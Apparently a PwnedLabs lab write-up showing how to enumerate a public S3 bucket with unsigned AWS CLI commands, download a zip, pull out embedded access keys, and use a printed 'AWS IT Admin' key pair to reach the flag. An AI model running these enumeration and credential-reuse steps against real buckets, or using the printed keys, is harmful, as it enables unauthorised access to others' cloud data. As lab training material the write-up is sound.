# S3 - Enum Basics - PwnedLabs

For example we have a website that is fetching resources from an S3 bucket. In the view source we spot the following:

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

In AWS we have the following type of buckets:

```
1. Amazon S3 Buckets (Object Storage)
General-Purpose Buckets – For storing any kind of object (files, images, logs, backups, etc.).
Static Website Hosting Buckets – Configured to serve a website directly from S3.
Logging Buckets – Used for storing access logs from CloudTrail, ALB, or S3 itself.
Data Lake Buckets – Used for storing large-scale data for analytics (e.g., AWS Lake Formation).
Backup Buckets – Used to store backups from AWS Backup or other services.
Machine Learning Data Buckets – For training ML models with AWS SageMaker.
```

From the AWS documentation [here](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingBucket.html), we observe the following:

1. Every object in a bucket has a URL that can be used to access it. As Amazon states: "Every object is contained in a bucket. For example, if the object named `photos/puppy.jpg` is stored in the `amzn-s3-demo-bucket` bucket in the US West (Oregon) Region, then it is addressable by using the URL `https://amzn-s3-demo-bucket.s3.us-west-2.amazonaws.com/photos/puppy.jpg"`
2.  In our source code above, we have "[https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css](https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css)" which means name of the bucket is dev.huge-logistics.com. Although it is not in the format stated above. GPT explains this:\
    \
    **1️⃣ Virtual-Hosted Style URL (Modern Default)**

    Most AWS documentation now suggests using the **virtual-hosted style** URL format, where the bucket name appears as a subdomain:

    ```
    https://<bucket-name>.s3.<region>.amazonaws.com/<object-path>
    ```

    For example, if the bucket is **amzn-s3-demo-bucket** in **us-west-2**, an object called `photos/puppy.jpg` would be accessed at:

    ```
    https://amzn-s3-demo-bucket.s3.us-west-2.amazonaws.com/photos/puppy.jpg
    ```

    This is now the default method for accessing objects in **newer AWS regions**.\
    \
    **2️⃣ Path-Style URL (Older Format, Used in Some Cases)**

    The URL you provided follows the older **path-style access** method:

    ```
    https://s3.amazonaws.com/<bucket-name>/<object-path>
    ```

    Your example:

    ```
    https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css
    ```

    Here:

    * `s3.amazonaws.com` is the base S3 endpoint.
    * `dev.huge-logistics.com` is the **bucket name**.
    * `/static/style.css` is the object path.

    AWS allowed this format for a long time, but in **2019**, AWS announced that **path-style URLs are being deprecated for new buckets** in most regions. However, older buckets or buckets in **legacy regions (like us-east-1)** still support it.
3. Okay so we can enumerate it.

Any command help in AWS is generally in the format:

`aws <module> <additional API call (if any)> help`

So, aws s3 help would tell that you can run "ls" to enumerate

```
aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
```

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

The following command would do a recursive "ls." If it can't access anything it would throw an error.

```
aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request --recursive
```

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

Similarly one can look in a specific folder by appending the folder name in the URL

```
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
```

<figure><img src="../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

However, we don't have access to admin and migration-files right now. We can copy the hl\_migration\_project.zip to current folder like so:

```
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

We see access keys in one of the files. This is a bad practice.

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

We can configure these credentials using "aws configure" command and access other folders

<figure><img src="../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

But I couldn't access these. So I accessed other folder

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

It had this line:

```
<CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>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</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
```

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

^ I configured the compromised access keys and accessed the flag that way.

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>





